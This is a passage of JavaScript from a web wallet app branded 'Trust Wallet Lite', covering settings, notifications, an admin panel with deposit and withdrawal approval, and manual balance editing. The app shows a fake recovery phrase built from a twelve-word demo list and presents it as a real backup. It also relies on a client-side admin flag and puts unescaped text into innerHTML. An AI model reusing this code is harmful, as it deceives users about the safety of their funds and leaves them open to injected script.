                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="showRecoveryPhrase()">
                <i class="fas fa-key"></i>
                <div class="info">
                    <div class="label">Recovery Phrase</div>
                    <div class="desc">View your backup phrase</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item logout-btn" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i>
                <div class="info">
                    <div class="label">Logout</div>
                    <div class="desc">Sign out of your wallet</div>
                </div>
            </div>
        </div>
        
        <div style="text-align: center; margin-top: 24px;">
            <span style="font-size: 10px; color: var(--text-muted);">Trust Wallet Lite v1.0</span>
        </div>
    `;
}

function showRecoveryPhrase() {
    if (!userData.recoveryPhrase) {
        // Generate a demo recovery phrase
        const words = ['apple', 'banana', 'cherry', 'dragon', 'eagle', 'forest', 'green', 'happy', 'island', 'jungle', 'king', 'light'];
        const randomWords = [];
        for (let i = 0; i < 12; i++) {
            randomWords.push(words[Math.floor(Math.random() * words.length)]);
        }
        userData.recoveryPhrase = randomWords.join(' ');
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
    }
    
    alert(`🔐 Your Recovery Phrase:\n\n${userData.recoveryPhrase}\n\nWrite this down and keep it safe! Never share it with anyone.`);
}

function logout() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.removeItem('twtpay_user');
        userData = null;
        currentUser = null;
        showOnboarding();
    }
}

function showTransactionHistory() {
    const transactions = userData.transactions || [];
    if (transactions.length === 0) {
        showToast('No transactions yet', 'info');
        return;
    }
    
    let message = '📋 Transaction History:\n\n';
    transactions.slice(0, 10).forEach(tx => {
        const date = new Date(tx.timestamp).toLocaleDateString();
        if (tx.type === 'send') {
            message += `📤 Sent ${tx.amount} ${tx.currency} (${date})\n`;
        } else if (tx.type === 'swap') {
            message += `🔄 Swapped ${tx.fromAmount} ${tx.fromCurrency} → ${tx.toAmount.toFixed(4)} ${tx.toCurrency} (${date})\n`;
        } else if (tx.type === 'referral_reward') {
            message += `🎉 Referral: +${tx.amount} ${tx.currency} (${date})\n`;
        }
    });
    
    alert(message);
}

function showSecuritySettings() {
    showToast('Security features coming soon!', 'info');
}

// ========== NOTIFICATIONS ==========
function addNotification(message, type = 'info') {
    const notification = {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        message: message,
        type: type,
        read: false,
        timestamp: new Date().toISOString()
    };
    
    if (!userData.notifications) userData.notifications = [];
    userData.notifications.unshift(notification);
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    updateNotificationBadge();
    showToast(message, type);
}

function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        const unread = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unread;
        badge.style.display = unread > 0 ? 'block' : 'none';
    }
}

function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    modal.classList.add('show');
    renderNotifications();
}

function renderNotifications() {
    const container = document.getElementById('notificationsList');
    if (!container) return;
    
    const notifications = userData.notifications || [];
    
    if (notifications.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-bell-slash"></i>
                <p>No notifications</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = `
        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
            <button onclick="clearReadNotifications()" class="btn-secondary" style="flex: 1; padding: 8px;">
                Clear Read
            </button>
            <button onclick="clearAllNotifications()" class="btn-secondary" style="flex: 1; padding: 8px; border-color: var(--danger); color: var(--danger);">
                Clear All
            </button>
        </div>
        ${notifications.map(notif => `
            <div class="notification-item ${notif.read ? '' : 'unread'}" onclick="markNotificationRead('${notif.id}')" style="background: ${notif.read ? 'transparent' : 'rgba(5,0,255,0.05)'}; padding: 12px; border-radius: 12px; margin-bottom: 8px; cursor: pointer;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="font-weight: 600;">${notif.type === 'success' ? '✓' : 'ℹ️'} Notification</span>
                    <span style="font-size: 10px; color: var(--text-muted);">${new Date(notif.timestamp).toLocaleTimeString()}</span>
                </div>
                <div style="font-size: 13px;">${notif.message}</div>
            </div>
        `).join('')}
    `;
}

function markNotificationRead(id) {
    const notif = userData.notifications.find(n => n.id === id);
    if (notif && !notif.read) {
        notif.read = true;
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        updateNotificationBadge();
        renderNotifications();
    }
}

function clearReadNotifications() {
    userData.notifications = userData.notifications.filter(n => !n.read);
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    updateNotificationBadge();
    renderNotifications();
    showToast('Cleared read notifications', 'success');
}

function clearAllNotifications() {
    if (confirm('Delete all notifications?')) {
        userData.notifications = [];
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        updateNotificationBadge();
        renderNotifications();
        showToast('All notifications cleared', 'success');
    }
}

function addTransaction(tx) {
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift(tx);
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
}

// ========== ADMIN PANEL ==========
function showAdminPanel() {
    if (!isAdmin) {
        showToast('Access denied', 'error');
        return;
    }
    document.getElementById('adminPanel').classList.add('show');
    refreshAdminPanel();
}

function closeAdminPanel() {
    document.getElementById('adminPanel').classList.remove('show');
}

function refreshAdminPanel() {
    showAdminTab('deposits');
}

function showAdminTab(tab) {
    document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
    if (event.target) event.target.classList.add('active');
    
    const content = document.getElementById('adminContent');
    
    if (tab === 'deposits') {
        const pendingDeposits = userData.depositRequests?.filter(d => d.status === 'pending') || [];
        
        if (pendingDeposits.length === 0) {
            content.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-hourglass-half"></i>
                    <p>No pending deposits</p>
                </div>
            `;
        } else {
            content.innerHTML = pendingDeposits.map(dep => `
                <div class="admin-transaction-card">
                    <div class="admin-tx-header">
                        <span class="admin-tx-type deposit">DEPOSIT</span>
                        <span class="admin-tx-status pending">Pending</span>
                    </div>
                    <div class="admin-tx-details">
                        <p><strong>User:</strong> ${dep.userId}</p>
                        <p><strong>Amount:</strong> ${dep.amount} ${dep.currency}</p>
                        <p><strong>TX Hash:</strong> ${dep.txHash.substring(0, 20)}...</p>
                        <p><strong>Date:</strong> ${new Date(dep.timestamp).toLocaleString()}</p>
                    </div>
                    <div class="admin-tx-actions">
                        <button class="admin-approve-btn" onclick="approveDeposit('${dep.id}')">Approve</button>
                        <button class="admin-reject-btn" onclick="rejectDeposit('${dep.id}')">Reject</button>
                    </div>
                </div>
            `).join('');
        }
    } else if (tab === 'withdrawals') {
        const pendingWithdrawals = userData.withdrawalRequests?.filter(w => w.status === 'pending') || [];
        
        if (pendingWithdrawals.length === 0) {
            content.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-hourglass-half"></i>
                    <p>No pending withdrawals</p>
                </div>
            `;
        } else {
            content.innerHTML = pendingWithdrawals.map(wd => `
                <div class="admin-transaction-card">
                    <div class="admin-tx-header">
                        <span class="admin-tx-type withdraw">WITHDRAWAL</span>
                        <span class="admin-tx-status pending">Pending</span>
                    </div>
                    <div class="admin-tx-details">
                        <p><strong>User:</strong> ${wd.userId}</p>
                        <p><strong>Amount:</strong> ${wd.amount} ${wd.currency}</p>
                        <p><strong>Address:</strong> ${wd.address.substring(0, 20)}...</p>
                        <p><strong>Date:</strong> ${new Date(wd.timestamp).toLocaleString()}</p>
                    </div>
                    <div class="admin-tx-actions">
                        <button class="admin-approve-btn" onclick="approveWithdrawal('${wd.id}')">Approve</button>
                        <button class="admin-reject-btn" onclick="rejectWithdrawal('${wd.id}')">Reject</button>
                    </div>
                </div>
            `).join('');
        }
    } else if (tab === 'users') {
        content.innerHTML = `
            <div style="padding: 20px;">
                <input type="text" id="adminUserIdInput" placeholder="Enter User ID" class="modal-input">
                <button onclick="adminLoadUser()" class="btn-primary" style="width: 100%; margin-top: 10px;">Search User</button>
                <div id="adminUserStats" style="margin-top: 20px;"></div>
            </div>
        `;
    } else if (tab === 'stats') {
        content.innerHTML = `
            <div class="stats-grid">
                <div class="stat-card">
                    <h3>Total Users</h3>
                    <div class="stat-value">1</div>
                </div>
                <div class="stat-card">
                    <h3>TWT Price</h3>
                    <div class="stat-value">$${(livePrices.TWT?.price || 1.25).toFixed(4)}</div>
                </div>
                <div class="stat-card">
                    <h3>Total TWT Distributed</h3>
                    <div class="stat-value">${(userData?.totalTwtEarned || 0).toLocaleString()}</div>
                </div>
                <div class="stat-card">
                    <h3>Total Referrals</h3>
                    <div class="stat-value">${userData?.referralCount || 0}</div>
                </div>
            </div>
        `;
    }
}

function approveDeposit(id) {
    const deposit = userData.depositRequests.find(d => d.id === id);
    if (deposit) {
        deposit.status = 'approved';
        userData.balances[deposit.currency] = (userData.balances[deposit.currency] || 0) + deposit.amount;
        addNotification(`✅ Your deposit of ${deposit.amount} ${deposit.currency} has been approved!`, 'success');
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        updateUI();
        refreshAdminPanel();
        showToast('Deposit approved', 'success');
    }
}

function rejectDeposit(id) {
    const deposit = userData.depositRequests.find(d => d.id === id);
    if (deposit) {
        deposit.status = 'rejected';
        addNotification(`❌ Your deposit of ${deposit.amount} ${deposit.currency} was rejected.`, 'error');
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        refreshAdminPanel();
        showToast('Deposit rejected', 'warning');
    }
}

function approveWithdrawal(id) {
    const withdrawal = userData.withdrawalRequests.find(w => w.id === id);
    if (withdrawal) {
        withdrawal.status = 'approved';
        addNotification(`✅ Your withdrawal of ${withdrawal.amount} ${withdrawal.currency} has been approved!`, 'success');
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        updateUI();
        refreshAdminPanel();
        showToast('Withdrawal approved', 'success');
    }
}

function rejectWithdrawal(id) {
    const withdrawal = userData.withdrawalRequests.find(w => w.id === id);
    if (withdrawal) {
        withdrawal.status = 'rejected';
        // Refund the amount
        userData.balances[withdrawal.currency] = (userData.balances[withdrawal.currency] || 0) + withdrawal.amount;
        addNotification(`❌ Your withdrawal of ${withdrawal.amount} ${withdrawal.currency} was rejected.`, 'error');
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        updateUI();
        refreshAdminPanel();
        showToast('Withdrawal rejected', 'warning');
    }
}

function adminLoadUser() {
    const userId = document.getElementById('adminUserIdInput')?.value.trim();
    if (!userId) {
        showToast('Please enter User ID', 'error');
        return;
    }
    
    const statsDiv = document.getElementById('adminUserStats');
    
    if (userId === currentUser) {
        statsDiv.innerHTML = `
            <div class="admin-transaction-card">
                <h4>User: ${userData.userName}</h4>
                <p><strong>ID:</strong> ${userData.userId}</p>
                <p><strong>Referrals:</strong> ${userData.referralCount}</p>
                <p><strong>TWT Balance:</strong> ${userData.balances.TWT?.toLocaleString()}</p>
                <p><strong>USDT Balance:</strong> $${userData.balances.USDT?.toFixed(2)}</p>
                <p><strong>Total TWT Earned:</strong> ${userData.totalTwtEarned?.toLocaleString()}</p>
                <div style="display: flex; gap: 10px; margin-top: 16px;">
                    <button onclick="adminAddBalance()" class="admin-approve-btn">Add Balance</button>
                    <button onclick="adminRemoveBalance()" class="admin-reject-btn">Remove Balance</button>
                </div>
            </div>
        `;
    } else {
        statsDiv.innerHTML = '<div style="padding: 20px; text-align: center;">User not found in demo mode</div>';
    }
}

function adminAddBalance() {
    const currency = prompt('Currency (TWT, USDT, BNB, etc.):', 'TWT');
    if (!currency) return;
    const amount = parseFloat(prompt(`Amount to ADD (${currency}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    
    userData.balances[currency] = (userData.balances[currency] || 0) + amount;
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    updateUI();
    showToast(`✅ Added ${amount} ${currency}`, 'success');
    adminLoadUser();
}

function adminRemoveBalance() {
    const currency = prompt('Currency (TWT, USDT, BNB, etc.):', 'TWT');
    if (!currency) return;
    const amount = parseFloat(prompt(`Amount to REMOVE (${currency}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    
    userData.balances[currency] = Math.max(0, (userData.balances[currency] || 0) - amount);
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    updateUI();
    showToast(`✅ Removed ${amount} ${currency}`, 'success');
    adminLoadUser();
}

// ========== UTILITY FUNCTIONS ==========
function updateUI() {
    if (currentTab === 'wallet') {
        renderWallet();
    } else if (currentTab === 'referral') {
        renderReferral();
    } else if (currentTab === 'twtpay') {
        renderTWTPay();
    } else if (currentTab === 'settings') {
        renderSettings();
    }
    updateNotificationBadge();
    updateTotalBalance();
}

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    
    toastMessage.textContent = message;
    toast.classList.remove('hidden');
    
    const icon = toast.querySelector('i');
    if (type === 'success') {
        icon.className = 'fa-regular fa-circle-check';
    } else if (type === 'error') {
        icon.className = 'fa-regular fa-circle-xmark';
    } else if (type === 'warning') {
        icon.className = 'fa-regular fa-circle-exclamation';
    } else {
        icon.className = 'fa-regular fa-circle-info';
    }
    
    setTimeout(() => {
        toast.classList.add('hidden');
    }, 3000);
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('show');
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setupNavbar() {
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', () => {
            const tab = item.dataset.tab;
            switchTab(tab);
        });
    });
}

function switchTab(tab) {
    currentTab = tab;
    
    document.querySelectorAll('.nav-item').forEach(item => {
        if (item.dataset.tab === tab) {
            item.classList.add('active');
        } else {
            item.classList.remove('active');
        }
    });
    
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    
    const targetSection = document.getElementById(`${tab}Section`);
    if (targetSection) targetSection.classList.add('active');
    
    switch(tab) {
        case 'wallet': renderWallet(); break;
        case 'referral': renderReferral(); break;
        case 'twtpay': renderTWTPay(); break;
        case 'settings': renderSettings(); break;
    }
}

function setupAdminCheck() {
    if (isAdmin) {
        const crownBtn = document.getElementById('adminCrownBtn');
        if (crownBtn) crownBtn.classList.remove('hidden');
    }
}

function setupEventListeners() {
    // Onboarding
    document.getElementById('createWalletBtn')?.addEventListener('click', createNewWallet);
    document.getElementById('importWalletBtn')?.addEventListener('click', showImportModal);
    document.getElementById('confirmImportBtn')?.addEventListener('click', importWallet);
    
    // Modals
    document.getElementById('confirmSendBtn')?.addEventListener('click', sendTransaction);
    document.getElementById('confirmSwapBtn')?.addEventListener('click', confirmSwap);
    document.getElementById('confirmDepositBtn')?.addEventListener('click', submitDeposit);
    document.getElementById('confirmWithdrawBtn')?.addEventListener('click', submitWithdrawal);
    
    // Currency selectors
    window.showSendModal = showSendModal;
    window.showReceiveModal = showReceiveModal;
    window.showSwapModal = showSwapModal;
    window.showBuyModal = () => document.getElementById('buyModal').classList.add('show');
    window.showDepositModal = showDepositModal;
    window.showWithdrawModal = showWithdrawModal;
    window.copyDepositAddress = copyDepositAddress;
    
    window.showCurrencySelector = showCurrencySelector;
    window.filterCurrencies = filterCurrencies;
    window.selectCurrency = selectCurrency;
    window.selectSwapCurrency = selectSwapCurrency;
    window.showSwapCurrencySelector = showSwapCurrencySelector;
    
    window.closeModal = closeModal;
    window.closeImportModal = closeImportModal;
    window.closeAdminPanel = closeAdminPanel;
    window.copyAddress = copyAddress;
    window.scrollToTop = scrollToTop;
    
    window.copyReferralLink = copyReferralLink;
    window.shareReferral = shareReferral;
    window.claimReferralMilestone = claimReferralMilestone;
    
    window.showAdminPanel = showAdminPanel;
    window.showAdminTab = showAdminTab;
    window.refreshAdminPanel = refreshAdminPanel;
    window.adminLoadUser = adminLoadUser;
    window.adminAddBalance = adminAddBalance;
    window.adminRemoveBalance = adminRemoveBalance;
    window.approveDeposit = approveDeposit;
    window.rejectDeposit = rejectDeposit;
    window.approveWithdrawal = approveWithdrawal;
    window.rejectWithdrawal = rejectWithdrawal;
    
    window.showNotifications = showNotifications;
    window.markNotificationRead = markNotificationRead;
    window.clearReadNotifications = clearReadNotifications;
    window.clearAllNotifications = clearAllNotifications;
    window.showTransactionHistory = showTransactionHistory;
    window.showSecuritySettings = showSecuritySettings;
    window.showRecoveryPhrase = showRecoveryPhrase;
    window.showTopUpModal = showTopUpModal;
    window.showCardSettings = showCardSettings;
    window.showCardTransactions = showCardTransactions;
    
    window.switchAssetTab = () => renderAssets();
}

let currentCurrencyContext = null;
let currentSwapContext = null;

function showCurrencySelector(context) {
    currentCurrencyContext = context;
    const modal = document.getElementById('currencySelectorModal');
    const list = document.getElementById('currencyList');
    
    list.innerHTML = ALL_ASSETS.map(asset => `
        <div class="currency-list-item" onclick="selectCurrency('${asset.symbol}')">
            <img src="${getCurrencyIcon(asset.symbol)}" alt="${asset.symbol}">
            <div class="currency-list-info">
                <h4>${asset.name}</h4>
                <p>${asset.symbol}</p>
            </div>
        </div>
    `).join('');
    
    modal.classList.add('show');
}

function showSwapCurrencySelector(context) {
    currentSwapContext = context;
    const modal = document.getElementById('currencySelectorModal');
    const list = document.getElementById('currencyList');
    
    list.innerHTML = ALL_ASSETS.map(asset => `
        <div class="currency-list-item" onclick="selectSwapCurrency('${asset.symbol}')">
            <img src="${getCurrencyIcon(asset.symbol)}" alt="${asset.symbol}">
            <div class="currency-list-info">
                <h4>${asset.name}</h4>
                <p>${asset.symbol}</p>
            </div>
        </div>
    `).join('');
    
    modal.classList.add('show');
}

function selectCurrency(symbol) {
    if (currentCurrencyContext === 'send') {
        document.getElementById('sendCurrencySymbol').textContent = symbol;
        document.getElementById('sendCurrencyIcon').src = getCurrencyIcon(symbol);
    } else if (currentCurrencyContext === 'receive') {
        document.getElementById('receiveCurrencySymbol').textContent = symbol;
        document.getElementById('receiveCurrencyIcon').src = getCurrencyIcon(symbol);
        updateReceiveAddress(symbol);
    } else if (currentCurrencyContext === 'deposit') {
        document.getElementById('depositCurrency').value = symbol;
        updateDepositInfo();
    } else if (currentCurrencyContext === 'withdraw') {
        document.getElementById('withdrawCurrency').value = symbol;
        updateWithdrawInfo();
    }
    closeModal('currencySelectorModal');
}

function selectSwapCurrency(symbol) {
    if (currentSwapContext === 'from') {
        document.getElementById('swapFromSymbol').textContent = symbol;
        document.getElementById('swapFromIcon').src = getCurrencyIcon(symbol);
        updateSwapBalances();
        calculateSwap();
    } else if (currentSwapContext === 'to') {
        document.getElementById('swapToSymbol').textContent = symbol;
        document.getElementById('swapToIcon').src = getCurrencyIcon(symbol);
        updateSwapBalances();
        calculateSwap();
    }
    closeModal('currencySelectorModal');
}

function filterCurrencies() {
    const search = document.getElementById('currencySearch').value.toLowerCase();
    const items = document.querySelectorAll('.currency-list-item');
    items.forEach(item => {
        const text = item.textContent.toLowerCase();
        item.style.display = text.includes(search) ? 'flex' : 'none';
    });
}

async function syncWithFirebase() {
    if (!db || !userData) return;
    
    try {
        const userDoc = await db.collection('users').doc(userData.userId).get();
        if (userDoc.exists) {
            const fbData = userDoc.data();
            userData.balances = { ...userData.balances, ...fbData.balances };
            userData.referralCount = fbData.referralCount || userData.referralCount;
            localStorage.setItem('twtpay_user', JSON.stringify(userData));
            updateUI();
        }
    } catch (error) {
        console.error("Sync error:", error);
    }
}

// Scroll listener
window.addEventListener('scroll', () => {
    const btn = document.getElementById('scrollTopBtn');
    if (btn) {
        btn.classList.toggle('show', window.scrollY > 300);
    }
});

console.log('✅ Trust Wallet Lite v1.0 - Full Featured');
console.log('✅ Features: Wallet, Send, Receive, Swap, Deposit, Withdraw, Referral System, Admin Panel, Virtual Card');
console.log('✅ Prices from CoinGecko, Icons from CoinMarketCap');
